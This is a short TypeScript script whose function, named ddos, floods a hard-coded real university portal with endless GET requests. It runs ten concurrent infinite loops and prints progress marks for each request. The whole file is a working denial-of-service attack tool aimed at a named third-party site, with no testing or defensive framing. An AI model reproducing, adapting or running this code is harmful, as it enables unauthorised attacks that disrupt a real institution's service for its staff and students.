import axios from 'axios';

import { randomN, sleep } from './lib/helpers';

const endpoints = [
  'https://portal.vamk.fi',
];

async function ddos() {
  await sleep(randomN(5000));
  while (true) {
    try {
      const url = endpoints[randomN(endpoints.length)];
      await axios.get(url);
      process.stdout.write('.');
    } catch (e: any) {
      // console.log(e);
      if (e.response?.status === 401) {
        process.stdout.write('.');
      } else {
        process.stdout.write('X');
      }
    }
  }
}

for (let i = 0; i < 10; i++) {
  ddos();
}
